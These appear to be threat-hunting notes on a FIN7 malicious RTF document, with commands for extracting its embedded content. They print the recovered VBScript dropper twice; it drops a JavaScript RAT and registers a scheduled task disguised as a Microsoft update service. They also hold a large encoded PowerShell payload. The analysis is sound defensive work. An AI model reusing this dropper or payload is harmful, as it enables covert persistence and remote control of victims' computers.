# FIN7 Threat Hunt
FIN7 Threat Hunt Document Analysis

## Extract exe in rtf
```bash
rtfdump 2-list.rtf -f O
rtfdump 2-list.rtf -f O -s 709 -Hi
rtfdump 2-list.rtf -f O -s 709 -H | grep exe
```

## Convert hex to png
```bash
cat image.bin | xxd -r -p > convert.bin
file convert.bin
mv convert.bin convert.png
```

## Convert chr in rtf
Find and copy all strings with "chr", removing extraneous text such as "vbcrlf".
```bash
python3 convert.py
```

```vb
Dim content1, content2
Dim oFSO, oFSO3strAppData, wshShell
Set wshShell = CreateObject("Wscript.Shell")
Set w = GetObject(,"Word.Application")
content1 = w.ActiveDocument.Shapes(4).TextFrame.TextRange.Text
content2 = w.ActiveDocument.Shapes(5).TextFrame.TextRange.Text
Set oFSO = CreateObject("Scripting.FileSystemObject")
Set oFSO2 = CreateObject("Scripting.FileSystemObject")
strLocalAppData = wshShell.ExpandEnvironmentStrings( "%LOCALAPPDATA%" ) + "\"
outFile = strLocalAppData + "sql-rat.js"
Set objFile = oFSO.CreateTextFile(outFile,True)
objFile.WriteLine content1
objFile.WriteLine content2
objFile.Close
oFSO2.CopyFile "C:\Windows\System32\wscript.exe", strLocalAppData + "adb156.exe"
Dim service
Set service = CreateObject("Schedule.Service")
Call service.Connect()
Dim rootFolder, taskDefinition, regInfo
Set rootFolder = service.GetFolder("\")
Set taskDefinition = service.NewTask(0)
Set regInfo = taskDefinition.RegistrationInfo
regInfo.Description = "Micriosoft Update Service"
regInfo.Author = "system"
Dim settings, triggers, trigger
Set settings = taskDefinition.settings
settings.Enabled = True
settings.StartWhenAvailable = True
settings.Hidden = False
Set triggers = taskDefinition.triggers
Set trigger = triggers.Create(2)
Dim currTime
Dim startTime, endTime
Dim datevalue, timevalue, dtsvalue
dtsnow = DateAdd("n", 5, Now)
dd = Right("00" & Day(dtsnow), 2)
mm = Right("00" & Month(dtsnow), 2)
yy = Year(dtsnow)
hh = Right("00" & Hour(dtsnow), 2)
nn = Right("00" & Minute(dtsnow), 2)
ss = Right("00" & Second(dtsnow), 2)
datevalue = yy & "-" & mm & "-" & dd
timevalue = hh & ":" & nn & ":" & ss
dtsvalue = datevalue & "T" & timevalue
endTime = "2024-04-18T09:10:00"
trigger.StartBoundary = dtsvalue
trigger.EndBoundary = endTime
trigger.DaysInterval = 1
trigger.ID = "DailyTriggerId"
trigger.Enabled = True
Dim Action
Set Action = taskDefinition.Actions.Create(0)
Set wshShell = CreateObject( "WScript.Shell" )
Action.Path = strLocalAppData + "adb156.exe"
Action.Arguments = "/b /e:jscript " + strLocalAppData + "sql-rat.js"
Call rootFolder.RegisterTaskDefinition("Micriosoft Update Service", taskDefinition, 6, , , 3)
Dim content1, content2
Dim oFSO, oFSO3strAppData, wshShell
Set wshShell = CreateObject("Wscript.Shell")
Set w = GetObject(,"Word.Application")
content1 = w.ActiveDocument.Shapes(4).TextFrame.TextRange.Text
content2 = w.ActiveDocument.Shapes(5).TextFrame.TextRange.Text
Set oFSO = CreateObject("Scripting.FileSystemObject")
Set oFSO2 = CreateObject("Scripting.FileSystemObject")
strLocalAppData = wshShell.ExpandEnvironmentStrings( "%LOCALAPPDATA%" ) + "\"
outFile = strLocalAppData + "sql-rat.js"
Set objFile = oFSO.CreateTextFile(outFile,True)
objFile.WriteLine content1
objFile.WriteLine content2
objFile.Close
oFSO2.CopyFile "C:\Windows\System32\wscript.exe", strLocalAppData + "adb156.exe"
Dim service
Set service = CreateObject("Schedule.Service")
Call service.Connect()
Dim rootFolder, taskDefinition, regInfo
Set rootFolder = service.GetFolder("\")
Set taskDefinition = service.NewTask(0)
Set regInfo = taskDefinition.RegistrationInfo
regInfo.Description = "Micriosoft Update Service"
regInfo.Author = "system"
Dim settings, triggers, trigger
Set settings = taskDefinition.settings
settings.Enabled = True
settings.StartWhenAvailable = True
settings.Hidden = False
Set triggers = taskDefinition.triggers
Set trigger = triggers.Create(2)
Dim currTime
Dim startTime, endTime
Dim datevalue, timevalue, dtsvalue
dtsnow = DateAdd("n", 5, Now)
dd = Right("00" & Day(dtsnow), 2)
mm = Right("00" & Month(dtsnow), 2)
yy = Year(dtsnow)
hh = Right("00" & Hour(dtsnow), 2)
nn = Right("00" & Minute(dtsnow), 2)
ss = Right("00" & Second(dtsnow), 2)
datevalue = yy & "-" & mm & "-" & dd
timevalue = hh & ":" & nn & ":" & ss
dtsvalue = datevalue & "T" & timevalue
endTime = "2024-04-18T09:10:00"
trigger.StartBoundary = dtsvalue
trigger.EndBoundary = endTime
trigger.DaysInterval = 1
trigger.ID = "DailyTriggerId"
trigger.Enabled = True
Dim Action
Set Action = taskDefinition.Actions.Create(0)
Set wshShell = CreateObject( "WScript.Shell" )
Action.Path = strLocalAppData + "adb156.exe"
Action.Arguments = "/b /e:jscript " + strLocalAppData + "sql-rat.js"
Call rootFolder.RegisterTaskDefinition("Micriosoft Update Service", taskDefinition, 6, , , 3)
```

## Reconstructing ps file from scriptblocks

Need to make sure LF is used rather than the default on Windows being CRLF.

```ps
getfilehash -algorithm md5 .\file.ps1
```

```ps
$EncodedCompressedFile = @'

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